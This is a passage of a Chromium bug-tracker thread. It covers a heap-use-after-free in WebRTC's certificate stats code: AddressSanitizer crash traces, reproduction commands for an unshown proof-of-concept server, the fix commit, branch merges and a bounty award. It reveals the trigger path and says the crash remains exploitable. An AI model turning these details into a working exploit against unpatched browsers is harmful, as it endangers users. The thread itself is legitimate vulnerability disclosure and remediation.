    #47 0x7fffec55c99b in content::RenderFrameImpl::CommitNavigation(mojo::StructPtr<blink::mojom::CommonNavigationParams>, mojo::StructPtr<blink::mojom::CommitNavigationParams>, mojo::StructPtr<network::mojom::URLResponseHead>, mojo::ScopedHandleBase<mojo::DataPipeConsumerHandle>, mojo::StructPtr<network::mojom::URLLoaderClientEndpoints>, std::__Cr::unique_ptr<blink::PendingURLLoaderFactoryBundle, std::__Cr::default_delete<blink::PendingURLLoaderFactoryBundle>>, std::__Cr::optional<std::__Cr::vector<mojo::StructPtr<blink::mojom::TransferrableURLLoader>, std::__Cr::allocator<mojo::StructPtr<blink::mojom::TransferrableURLLoader>>>>, mojo::StructPtr<blink::mojom::ControllerServiceWorkerInfo>, mojo::StructPtr<blink::mojom::ServiceWorkerContainerInfoForClient>, mojo::PendingRemote<network::mojom::URLLoaderFactory>, mojo::PendingRemote<network::mojom::URLLoaderFactory>, mojo::PendingAssociatedRemote<blink::mojom::FetchLaterLoaderFactory>, base::TokenType<blink::DocumentTokenTypeMarker> const&, base::UnguessableToken const&, base::Uuid const&, mojo::StructPtr<blink::mojom::PolicyContainer>, mojo::PendingRemote<blink::mojom::CodeCacheHost>, mojo::PendingRemote<blink::mojom::CodeCacheHost>, mojo::StructPtr<content::mojom::CookieManagerInfo>, mojo::StructPtr<content::mojom::StorageInfo>, base::OnceCallback<void (mojo::StructPtr<content::mojom::DidCommitProvisionalLoadParams>, mojo::StructPtr<content::mojom::DidCommitProvisionalLoadInterfaceParams>)>) content/renderer/render_frame_impl.cc:2859:33
    #48 0x7fffec539b0d in content::NavigationClient::CommitNavigation(mojo::StructPtr<blink::mojom::CommonNavigationParams>, mojo::StructPtr<blink::mojom::CommitNavigationParams>, mojo::StructPtr<network::mojom::URLResponseHead>, mojo::ScopedHandleBase<mojo::DataPipeConsumerHandle>, mojo::StructPtr<network::mojom::URLLoaderClientEndpoints>, std::__Cr::unique_ptr<blink::PendingURLLoaderFactoryBundle, std::__Cr::default_delete<blink::PendingURLLoaderFactoryBundle>>, std::__Cr::optional<std::__Cr::vector<mojo::StructPtr<blink::mojom::TransferrableURLLoader>, std::__Cr::allocator<mojo::StructPtr<blink::mojom::TransferrableURLLoader>>>>, mojo::StructPtr<blink::mojom::ControllerServiceWorkerInfo>, mojo::StructPtr<blink::mojom::ServiceWorkerContainerInfoForClient>, mojo::PendingRemote<network::mojom::URLLoaderFactory>, mojo::PendingRemote<network::mojom::URLLoaderFactory>, mojo::PendingAssociatedRemote<blink::mojom::FetchLaterLoaderFactory>, base::TokenType<blink::DocumentTokenTypeMarker> const&, base::UnguessableToken const&, base::Uuid const&, mojo::StructPtr<blink::mojom::PolicyContainer>, mojo::PendingRemote<blink::mojom::CodeCacheHost>, mojo::PendingRemote<blink::mojom::CodeCacheHost>, mojo::StructPtr<content::mojom::CookieManagerInfo>, mojo::StructPtr<content::mojom::StorageInfo>, base::OnceCallback<void (mojo::StructPtr<content::mojom::DidCommitProvisionalLoadParams>, mojo::StructPtr<content::mojom::DidCommitProvisionalLoadInterfaceParams>)>) content/renderer/navigation_client.cc:87:18
    #49 0x7fffe8510905 in content::mojom::NavigationClientStubDispatch::AcceptWithResponder(content::mojom::NavigationClient*, mojo::Message*, std::__Cr::unique_ptr<mojo::MessageReceiverWithStatus, std::__Cr::default_delete<mojo::MessageReceiverWithStatus>>) gen/content/common/navigation_client.mojom.cc:1746:13
    #50 0x7ffff777f29e in mojo::InterfaceEndpointClient::HandleValidatedMessage(mojo::Message*) mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:1036:56
    #51 0x7ffff779669b in mojo::MessageDispatcher::Accept(mojo::Message*) mojo/public/cpp/bindings/lib/message_dispatcher.cc:44:19
    #52 0x7ffff7784ba4 in mojo::InterfaceEndpointClient::HandleIncomingMessage(mojo::Message*) mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:747:20
    #53 0x7fffe4b56be7 in IPC::ChannelAssociatedGroupController::AcceptOnEndpointThread(mojo::Message, IPC::(anonymous namespace)::ScopedUrgentMessageNotification) ipc/ipc_mojo_bootstrap.cc:1199:24
    #54 0x7fffe4b58ead in base::internal::Invoker<base::internal::FunctorTraits<void (IPC::ChannelAssociatedGroupController::*&&)(mojo::Message, IPC::(anonymous namespace)::ScopedUrgentMessageNotification), IPC::ChannelAssociatedGroupController*&&, mojo::Message&&, IPC::(anonymous namespace)::ScopedUrgentMessageNotification&&>, base::internal::BindState<true, true, false, void (IPC::ChannelAssociatedGroupController::*)(mojo::Message, IPC::(anonymous namespace)::ScopedUrgentMessageNotification), scoped_refptr<IPC::ChannelAssociatedGroupController>, mojo::Message, IPC::(anonymous namespace)::ScopedUrgentMessageNotification>, void ()>::RunOnce(base::internal::BindStateBase*) base/functional/bind_internal.h:740:12
    #55 0x7ffff6b60c82 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/functional/callback.h:155:12
    #56 0x7ffff6be216e in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) base/task/common/task_annotator.h:112:5
    #57 0x7ffff6be1146 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:346:40
    #58 0x7ffff6a033f1 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) base/message_loop/message_pump_default.cc:42:55
    #59 0x7ffff6be37e8 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:650:12
    #60 0x7ffff6acb002 in base::RunLoop::Run(base::Location const&) base/run_loop.cc:135:14
    #61 0x7fffec602925 in content::RendererMain(content::MainFunctionParams) content/renderer/renderer_main.cc:364:16
    #62 0x7fffeca35227 in content::RunZygote(content::ContentMainDelegate*) content/app/content_main_runner_impl.cc:664:14
    #63 0x7fffeca363ee in content::RunOtherNamedProcessTypeMain(std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&, content::MainFunctionParams, content::ContentMainDelegate*) content/app/content_main_runner_impl.cc:771:12
    #64 0x7fffeca3894a in content::ContentMainRunnerImpl::Run() content/app/content_main_runner_impl.cc:1150:10
    #65 0x7fffeca330d3 in content::RunContentProcess(content::ContentMainParams, content::ContentMainRunner*) content/app/content_main.cc:358:36
    #66 0x7fffeca3345a in content::ContentMain(content::ContentMainParams) content/app/content_main.cc:371:10
    #67 0x55555bd7ff15 in ChromeMain chrome/app/chrome_main.cc:191:12
    #68 0x7fff86429d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16

SUMMARY: AddressSanitizer: heap-use-after-free gen/third_party/libc++/src/include/__tree:950:54 in webrtc::StatsReport::AddId(webrtc::StatsReport::StatsValueName, webrtc::scoped_refptr<webrtc::StatsReport::IdBase> const&)
Shadow bytes around the buggy address:
  0x7c3f784f6380: f7 fa fd fd fd fd fd fd f7 fa 00 00 00 00 00 00
  0x7c3f784f6400: f7 fa 00 00 00 00 00 fa f7 fa 00 00 00 00 00 00
  0x7c3f784f6480: f7 fa 00 00 00 00 00 00 f7 fa 00 00 00 00 00 fa
  0x7c3f784f6500: f7 fa 00 00 00 00 00 00 f7 fa 00 00 00 00 00 00
  0x7c3f784f6580: f7 fa 00 00 00 00 00 00 f7 fa 00 00 00 00 00 00
=>0x7c3f784f6600: f7 fa fd fd fd[fd]fd fa f7 fa fd fd fd fd fd fd
  0x7c3f784f6680: f7 fa fd fd fd fd fd fd f7 fa fd fd fd fd fd fd
  0x7c3f784f6700: f7 fa 00 00 00 00 00 00 f7 fa 00 00 00 00 00 fa
  0x7c3f784f6780: f7 fa 00 00 00 00 00 00 f7 fa 00 00 00 00 00 00
  0x7c3f784f6800: f7 fa 00 00 00 00 00 00 fa fa fa fa fa fa fa fa
  0x7c3f784f6880: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb

==3758751==ADDITIONAL INFO

==3758751==Note: Please include this section with the ASan report.
Task trace:
    #0 0x7fffdd43b777 in webrtc::MethodCall<webrtc::PeerConnectionInterface, void>::Marshal(webrtc::Thread*) third_party/webrtc/pc/proxy.h:113:10
    #1 0x7fffa667665e in blink::DOMTimer::DOMTimer(blink::ExecutionContext&, blink::ScheduledAction*, base::TimeDelta, bool) third_party/blink/renderer/core/scheduler/dom_timer.cc:343:27
    #2 0x7fff8e529938 in blink::RTCPeerConnection::ScheduleDispatchEvent(blink::Event*, base::OnceCallback<bool ()>) third_party/blink/renderer/modules/peerconnection/rtc_peer_connection.cc:2906:57
    #3 0x7fff8e57a49a in blink::RTCPeerConnectionHandler::Observer::OnConnectionChange(webrtc::PeerConnectionInterface::PeerConnectionState) third_party/blink/renderer/modules/peerconnection/rtc_peer_connection_handler.cc:579:32


Command line: `/proc/self/exe --type=renderer --crashpad-handler-pid=3758694 --enable-crash-reporter=, --user-data-dir=/tmp/poc-wrtc209-1772138706 --change-stack-guard-on-fork=enable --no-sandbox --ozone-platform=x11 --disable-gpu-compositing --lang=en-US --num-raster-threads=4 --enable-main-frame-before-activation --renderer-client-id=5 --time-ticks-at-unix-epoch=-1771465754285877 --launch-time-ticks=672956606329 --shared-files=v8_context_snapshot_data:100 --metrics-shmem-handle=4,i,16379484430138639293,10458166459162828460,2097152 --field-trial-handle=3,i,14272539049402113890,124114295588120251,262144 --variations-seed-version --pseudonymization-salt-handle=7,i,11990994753229010959,12060239982854982920,4 --trace-process-track-uuid=3190708990997080739 --enable-logging=stderr`


MiraclePtr Status: NOT PROTECTED
No raw_ptr<T> access to this region was detected prior to this crash.
This crash is still exploitable with MiraclePtr.
Refer to https://chromium.googlesource.com/chromium/src/+/main/base/memory/raw_ptr.md for details.

==3758751==END OF ADDITIONAL INFO

==3758751==ABORTING

```

### pe...@google.com (2026-02-26)

Thank you for providing more feedback. Adding the requester to the CC list.

### aj...@google.com (2026-02-27)

Trying:

```
C:\Python\Python312\python.exe -m venv quilt
.\quilt\Scripts\Activate.ps1
python3 -m pip install aiortc aiohttp
python3 .\poc_wrtc209_server.py 8091

```

elsewhere:

```
run-chrome-asan --no-first-run --disable-extensions --no-sandbox --enable-logging --log-file=d:\temp\asan.log http://localhost:8091/

```

renderer gets result\_code\_killed but also reaches the uaf, see attached asan.log.

```
=================================================================
==21848==ERROR: AddressSanitizer: heap-use-after-free on address 0x1213d4f52aa8 at pc 0x7ff9ecce807e bp 0x0021f6dfeca0 sp 0x0021f6dfece8
READ of size 8 at 0x1213d4f52aa8 thread T12
    #0 0x7ff9ecce807d in webrtc::StatsReport::AddId(enum webrtc::StatsReport::StatsValueName, class webrtc::scoped_refptr<class webrtc::StatsReport::IdBase> const &) D:\chromium\src\third_party\webrtc\api\legacy_stats_types.cc:782:24
    #1 0x7ff9ecdcbed9 in webrtc::LegacyStatsCollector::AddCertificateReports(class std::__Cr::unique_ptr<struct webrtc::SSLCertificateStats, struct std::__Cr::default_delete<struct webrtc::SSLCertificateStats>>) D:\chromium\src\third_party\webrtc\pc\legacy_stats_collector.cc:810:20
    #2 0x7ff9ecdcd9e1 in webrtc::LegacyStatsCollector::ExtractSessionInfo_s(struct webrtc::LegacyStatsCollector::SessionStats &) D:\chromium\src\third_party\webrtc\pc\legacy_stats_collector.cc:1058:11
    #3 0x7ff9ecdc7b36 in webrtc::LegacyStatsCollector::ExtractSessionAndDataInfo(void) D:\chromium\src\third_party\webrtc\pc\legacy_stats_collector.cc:953:3
    #4 0x7ff9ecdc6d11 in webrtc::LegacyStatsCollector::UpdateStats(enum webrtc::PeerConnectionInterface::StatsOutputLevel) D:\chromium\src\third_party\webrtc\pc\legacy_stats_collector.cc:733:7
    #5 0x7ff9ecfbb495 in webrtc::PeerConnection::Close(void) D:\chromium\src\third_party\webrtc\pc\peer_connection.cc:1901:18
    #6 0x7ff9ed024975 in absl::internal_any_invocable::LocalInvoker<0, void, class `public: void __cdecl webrtc::MethodCall<class webrtc::PeerConnectionInterface, void>::Marshal(clas
...
==21848==ADDITIONAL INFO
...

Command line: `"d:\chromium\src\out\Asan\chrome.exe" --type=renderer --user-data-dir="d:\temp\asan-profile" --no-pre-read-main-dll --no-sandbox --enable-blink-features=MojoJS --video-capture-use-gpu-memory-buffer --lang=en-US --device-scale-factor=1 --num-raster-threads=4 --enable-main-frame-before-activation --renderer-client-id=5 --time-ticks-at-unix-epoch=-1771952238382227 --launch-time-ticks=267929509436 --metrics-shmem-handle=3316,i,10478599790132242043,1116155258034286353,2097152 --field-trial-handle=1888,i,8460460938318717578,16661695709144155493,262144 --variations-seed-version --pseudonymization-salt-handle=2044,i,3353038718559057519,2382656810352409516,4 --trace-process-track-uuid=3190708990997080739 --enable-logging=handle --log-file=3312 --mojo-platform-channel-handle=3308 /prefetch:1`


MiraclePtr Status: NOT PROTECTED
No raw_ptr<T> access to this region was detected prior to this crash.
This crash is still exploitable with MiraclePtr.
Refer to https://chromium.googlesource.com/chromium/src/+/main/base/memory/raw_ptr.md for details.

==21848==END OF ADDITIONAL INFO

```

### aj...@google.com (2026-02-27)

tommi - you wrote all of this so please take a look or find an appropriate owner.

### ch...@google.com (2026-02-28)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2026-02-28)

Setting Priority to P1 to match Severity s1. To ensure SLOs are tracked correctly, priority must exceed severity.

### ch...@google.com (2026-03-10)

tommi: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.[internal debugging info: security\_nag\_check]

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### dx...@google.com (2026-03-24)

Project: src  

Branch:  main  

Author:  Tommi [tommi@webrtc.org](mailto:tommi@webrtc.org)  

Link:    <https://webrtc-review.googlesource.com/459320>

Refactor AddCertificateReports to prevent crash

---


Expand for full commit details
```
     
    When processing certificate stats with duplicate fingerprints, 
    ReplaceOrAddNew would delete the existing stats report that was 
    previously added and pointed to by first_report or prev_report. 
     
    By adding tracking for duplicate fingerprints we can find the existing 
    report and avoid replacing it. 
     
    Bug: chromium:486495143 
    Change-Id: Iabc41ae064476c1e5853cdff1dbbcab449f8df27 
    Reviewed-on: https://webrtc-review.googlesource.com/c/src/+/459320 
    Reviewed-by: Evan Shrubsole <eshr@webrtc.org> 
    Reviewed-by: Henrik Boström <hbos@webrtc.org> 
    Commit-Queue: Tomas Gunnarsson <tommi@webrtc.org> 
    Cr-Commit-Position: refs/heads/main@{#47242}

```

---

Files:

- M `pc/BUILD.gn`
- M `pc/legacy_stats_collector.cc`
- M `pc/legacy_stats_collector.h`
- M `pc/legacy_stats_collector_unittest.cc`

---

Hash: 731795bab2d89be63e20485407a850173d5d3665  

Date: Mon Mar 23 16:29:21 2026


---

### dx...@google.com (2026-03-24)

Project: chromium/src  

Branch:  main  

Author:  chromium-autoroll [chromium-autoroll@skia-public.iam.gserviceaccount.com](mailto:chromium-autoroll@skia-public.iam.gserviceaccount.com)  

Link:    <https://chromium-review.googlesource.com/7696278>

Roll WebRTC from 49a0591324bf to c397ee98ed8f (2 revisions)

---


Expand for full commit details
```
     
    https://webrtc.googlesource.com/src.git/+log/49a0591324bf..c397ee98ed8f 
     
    2026-03-24 tommi@webrtc.org Follow-up auto -> explicit type 
    2026-03-24 tommi@webrtc.org Refactor AddCertificateReports to prevent crash 
     
    If this roll has caused a breakage, revert this CL and stop the roller 
    using the controls here: 
    https://autoroll.skia.org/r/webrtc-chromium-autoroll 
    Please CC webrtc-chromium-sheriffs-robots@google.com,webrtc-infra@google.com on the revert to ensure that a human 
    is aware of the problem. 
     
    To file a bug in WebRTC: https://bugs.chromium.org/p/webrtc/issues/entry 
    To file a bug in Chromium: https://bugs.chromium.org/p/chromium/issues/entry 
     
    To report a problem with the AutoRoller itself, please file a bug: 
    https://issues.skia.org/issues/new?component=1389291&template=1850622 
     
    Documentation for the AutoRoller is here: 
    https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md 
     
    Bug: chromium:486495143 
    Tbr: webrtc-chromium-sheriffs-robots@google.com 
    Change-Id: I53ed38503508971fc15b41c21ebfe7bff9dbcdc8 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7696278 
    Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Bot-Commit: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Cr-Commit-Position: refs/heads/main@{#1604350}

```

---

Files:

- M `DEPS`
- M `third_party/webrtc`

---

Hash: [c3f54acc34904bdcc6e2f0447ad3daa703782fa8](https://chromiumdash.appspot.com/commit/c3f54acc34904bdcc6e2f0447ad3daa703782fa8)  

Date: Tue Mar 24 20:29:27 2026


---

### ch...@google.com (2026-03-25)

Dear owner, thanks for fixing this bug. We've reopened it because:

- It is not clear which CLs have ‘fixed’ (=required to consider the bug resolved; e.g. not logging) this bug. Please fill in the “Fixed By Code Changes” field with the appropriate Gerrit url to disambiguate using the following guidelines:
  - If there are multiple CLs required, please list all.
  - If the fix landed in a third party library (v8, Dawn, etc), please list the third party commits - not the rolls.
  - If there are cherrypicks or back merges, please list the original commits which landed on HEAD.
  - If there is no relevant Gerrit link (i.e. the fix does not live in or roll into Chromium), please use the value ‘NA’.
  - If this is a non-browser ChromeOS-specific bug, please move it to component 1335705 in the Google issue tracker.
  - If this field requires human intervention for some reason, please add this bug to the hotlist id 6265590.
    After resolving the above issue(s), this bug can be marked closed again. Thanks for your time!

### to...@chromium.org (2026-03-25)

The webrtc commit (third party) that has the fix: 731795bab2d89be63e20485407a850173d5d3665
The gerrit link to that fix: https://webrtc-review.git.corp.google.com/c/src/+/459320

### ch...@google.com (2026-03-25)

Dear owner, thanks for fixing this bug. We've reopened it because:

- It is not clear which CLs have ‘fixed’ (=required to consider the bug resolved; e.g. not logging) this bug. Please fill in the “Fixed By Code Changes” field with the appropriate Gerrit url to disambiguate using the following guidelines:
  - If there are multiple CLs required, please list all.
  - If the fix landed in a third party library (v8, Dawn, etc), please list the third party commits - not the rolls.
  - If there are cherrypicks or back merges, please list the original commits which landed on HEAD.
  - If there is no relevant Gerrit link (i.e. the fix does not live in or roll into Chromium), please use the value ‘NA’.
  - If this is a non-browser ChromeOS-specific bug, please move it to component 1335705 in the Google issue tracker.
  - If this field requires human intervention for some reason, please add this bug to the hotlist id 6265590.
    After resolving the above issue(s), this bug can be marked closed again. Thanks for your time!

### ch...@google.com (2026-03-26)

Security Merge Request:

Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

Requesting merge to stable (M146) because latest trunk commit (1604350) appears to be after stable branch point (1582197).

Merge review required: a commit with DEPS changes was detected.

Requesting merge to beta (M147) because latest trunk commit (1604350) appears to be after beta branch point (1596535).

Merge review required: a commit with DEPS changes was detected.

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### dr...@chromium.org (2026-03-26)

No crashes in Canary, approved to merge to M146 and M147.

### ch...@google.com (2026-03-31)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### dx...@google.com (2026-03-31)

Project: src  

Branch:  refs/branch-heads/7680  

Author:  Tommi [tommi@webrtc.org](mailto:tommi@webrtc.org)  

Link:    <https://webrtc-review.googlesource.com/461161>

[M146] Refactor AddCertificateReports to prevent crash

---


Expand for full commit details
```
     
    When processing certificate stats with duplicate fingerprints, 
    ReplaceOrAddNew would delete the existing stats report that was 
    previously added and pointed to by first_report or prev_report. 
     
    By adding tracking for duplicate fingerprints we can find the existing 
    report and avoid replacing it. 
     
    (cherry picked from commit 731795bab2d89be63e20485407a850173d5d3665) 
     
    Bug: chromium:486495143 
    Change-Id: Iabc41ae064476c1e5853cdff1dbbcab449f8df27 
    Reviewed-on: https://webrtc-review.googlesource.com/c/src/+/459320 
    Reviewed-by: Evan Shrubsole <eshr@webrtc.org> 
    Reviewed-by: Henrik Boström <hbos@webrtc.org> 
    Commit-Queue: Tomas Gunnarsson <tommi@webrtc.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#47242} 
    Reviewed-on: https://webrtc-review.googlesource.com/c/src/+/461161 
    Cr-Commit-Position: refs/branch-heads/7680@{#6} 
    Cr-Branched-From: d1972add2a63b2a528a6471d447f82e0010b5215-refs/heads/main@{#46853}

```

---

Files:

- M `pc/BUILD.gn`
- M `pc/legacy_stats_collector.cc`
- M `pc/legacy_stats_collector.h`
- M `pc/legacy_stats_collector_unittest.cc`

---

Hash: 70d86bbfaeeadffb1193c2aad245edd23ef251ef  

Date: Mon Mar 23 16:29:21 2026


---

### dx...@google.com (2026-03-31)

Project: src  

Branch:  refs/branch-heads/7727  

Author:  Tommi [tommi@webrtc.org](mailto:tommi@webrtc.org)  

Link:    <https://webrtc-review.googlesource.com/461160>

[M147] Refactor AddCertificateReports to prevent crash

---


Expand for full commit details
```
     
    When processing certificate stats with duplicate fingerprints, 
    ReplaceOrAddNew would delete the existing stats report that was 
    previously added and pointed to by first_report or prev_report. 
     
    By adding tracking for duplicate fingerprints we can find the existing 
    report and avoid replacing it. 
     
    (cherry picked from commit 731795bab2d89be63e20485407a850173d5d3665) 
     
    Bug: chromium:486495143 
    Change-Id: Iabc41ae064476c1e5853cdff1dbbcab449f8df27 
    Reviewed-on: https://webrtc-review.googlesource.com/c/src/+/459320 
    Reviewed-by: Evan Shrubsole <eshr@webrtc.org> 
    Reviewed-by: Henrik Boström <hbos@webrtc.org> 
    Commit-Queue: Tomas Gunnarsson <tommi@webrtc.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#47242} 
    Reviewed-on: https://webrtc-review.googlesource.com/c/src/+/461160 
    Cr-Commit-Position: refs/branch-heads/7727@{#10} 
    Cr-Branched-From: 5788235ac856f62f1522d1491c4a8b00dba10c82-refs/heads/main@{#47086}

```

---

Files:

- M `pc/BUILD.gn`
- M `pc/legacy_stats_collector.cc`
- M `pc/legacy_stats_collector.h`
- M `pc/legacy_stats_collector_unittest.cc`

---

Hash: 9179833d210d105aede5d4ec516734a6bd1ef2e8  

Date: Mon Mar 23 16:29:21 2026


---

### pe...@google.com (2026-03-31)

LTS Milestone M144

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### sp...@google.com (2026-04-02)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $11000.00 for this report.

Rationale for this decision:
High quality. Renderer / memory corruption in a sandboxed process with bisect


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### pe...@google.com (2026-05-12)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### vi...@google.com (2026-05-15)

1. <https://webrtc-review.git.corp.google.com/c/src/+/472000>
2. Low. Just a couple of simple conflicts when merging back the original CL.
3. 146 and 147
4. Yes

### dx...@google.com (2026-06-05)

Project: src  

Branch:  refs/branch-heads/7559  

Author:  Tiago Vignatti [vignatti@google.com](mailto:vignatti@google.com)  

Link:    <https://webrtc-review.googlesource.com/472000>

[M144-LTS] Refactor AddCertificateReports to prevent crash

---


Expand for full commit details
```
     
    M144-LTS conflicts in the following files due to 
    "//third_party/abseil-cpp/absl/base:nullability" and 
    "//third_party/abseil-cpp/absl/functional:any_invocable" were not 
    present in M144 when comparison with main, 146 and 147 branches: 
        pc/BUILD.gn 
        pc/legacy_stats_collector.cc 
     
    When processing certificate stats with duplicate fingerprints, 
    ReplaceOrAddNew would delete the existing stats report that was 
    previously added and pointed to by first_report or prev_report. 
     
    By adding tracking for duplicate fingerprints we can find the existing 
    report and avoid replacing it. 
     
    (cherry picked from commit 731795bab2d89be63e20485407a850173d5d3665) 
     
    No-try: true 
    Bug: chromium:486495143 
    Change-Id: Ibcd68d3fc6ac58077004c9a04fec79f226654da4 
    Reviewed-on: https://webrtc-review.googlesource.com/c/src/+/459320 
    Reviewed-by: Evan Shrubsole <eshr@webrtc.org> 
    Reviewed-by: Henrik Boström <hbos@webrtc.org> 
    Commit-Queue: Tomas Gunnarsson <tommi@webrtc.org> 
    Reviewed-on: https://webrtc-review.googlesource.com/c/src/+/472000 
    Reviewed-by: Tomas Gunnarsson <tommi@webrtc.org> 
    Reviewed-by: Harald Alvestrand <hta@webrtc.org> 
    Reviewed-by: Mirko Bonadei <mbonadei@webrtc.org> 
    Cr-Commit-Position: refs/branch-heads/7559@{#9} 
    Cr-Branched-From: f680c1893f3b166b370439da52ae82d02f54969c-refs/heads/main@{#46356}

```

---

Files:

- M `pc/BUILD.gn`
- M `pc/legacy_stats_collector.cc`
- M `pc/legacy_stats_collector.h`
- M `pc/legacy_stats_collector_unittest.cc`

---

Hash: b10bfaade4ec4da988e49eed240d42f6e3a6f4ce  

Date: Tue May 12 18:40:51 2026


---

### ch...@google.com (2026-07-03)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/486495143)*
